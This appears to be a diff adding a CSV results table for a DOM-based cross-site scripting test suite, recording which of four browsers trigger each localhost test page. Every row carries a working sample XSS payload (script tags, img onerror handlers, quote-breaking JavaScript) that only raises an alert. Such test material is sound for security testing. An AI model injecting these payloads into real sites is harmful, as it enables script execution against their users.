@@ -1,0 +1,18 @@
+TEST CASE,PHANTOMJS 1.9,IE 9,Chrome (37),Firefox (32.0),URL with valid sample payload
+location.hash.htmlinject.dquot.html,[NOTOK],[OK],[NOTOK],[NOTOK],"http://localhost/domhell/location.hash.htmlinject.dquot.html#""><script>alert(299792458)</script>"
+location.hash.htmlinject.squot.html,[NOTOK],[OK],[NOTOK],[NOTOK],http://localhost/domhell/location.hash.htmlinject.squot.html#'<script>alert(299792458)</script>
+location.hash.htmlinject.html,[NOTOK],[OK],[OK],[OK],"http://localhost/domhell/location.hash.htmlinject.html#<img src=""1"" onerror=""alert(299792458)"""
+location.hash.jsinject.html,[OK],[OK],[OK],[OK],http://localhost/domhell/location.hash.jsinject.html#1;alert(299792458)//
+location.hash.jsinject.squot.html,[OK],[OK],[OK],[OK],http://localhost/domhell/location.hash.jsinject.squot.html#';alert(299792458)//
+location.hash.jsinject.dquot.html,[NOTOK],[OK],[OK],[OK],"http://localhost/domhell/location.hash.jsinject.dquot.html#"";alert(299792458)//"
+location.pathname.jsinject.squot.php,[OK],[OK],[OK],[NOTOK],http://localhost/domhell/location.pathname.jsinject.squot.php/';alert(299792458)//
+location.pathname.jsinject.dquot.php,[OK],[NOTOK],[NOTOK],[NOTOK],"http://localhost/domhell/location.pathname.jsinject.dquot.php/"";alert(299792458)//"
+location.pathname.htmlinject.php,[OK],[NOTOK],[NOTOK],[NOTOK],http://localhost/domhell/location.pathname.htmlinject.php/<script>alert(299792458)</script> 
+location.pathname.htmlinject.squot.php,[OK],[NOTOK],[NOTOK],[NOTOK],http://localhost/domhell/location.pathname.htmlinject.squot.php/'><script>alert(299792458)</script>
+location.pathname.htmlinject.dquot.php,[OK],[NOTOK],[NOTOK],[NOTOK],"http://localhost/domhell/location.pathname.htmlinject.dquot.php/""><script>alert(299792458)</script>"
+location.search.jsinject.dquot.html,[NOTOK],[NOTOK],[NOTOK],[NOTOK],"http://localhost/domhell/location.search.jsinject.dquot.html?a="";alert(299792458)//"
+location.search.jsinject.squot.html,[OK],[OK],[NOTOK],[NOTOK],http://localhost/domhell/location.search.jsinject.squot.html?a=';alert(299792458);'
+location.search.jsinject.html,[OK],[OK],[OK],[OK],http://localhost/domhell/location.search.jsinject.html?a=1;alert(299792458)//
+location.search.htmlinject.squot.html,[NOTOK],[OK],[NOTOK],[NOTOK],http://localhost/domhell/location.search.htmlinject.squot.html?a='><img src='1' onerror='alert(299792458)'
+location.search.htmlinject.dquot.html,[NOTOK],[OK],[NOTOK],[NOTOK],"http://localhost/domhell/location.search.htmlinject.dquot.html?a=""><img src=""1"" onerror=""alert(299792458)"""
+location.search.htmlinject.html,[NOTOK],[OK],[NOTOK],[NOTOK],http://localhost/domhell/location.search.htmlinject.html?a=<img src=1 onerror=alert(299792458)//
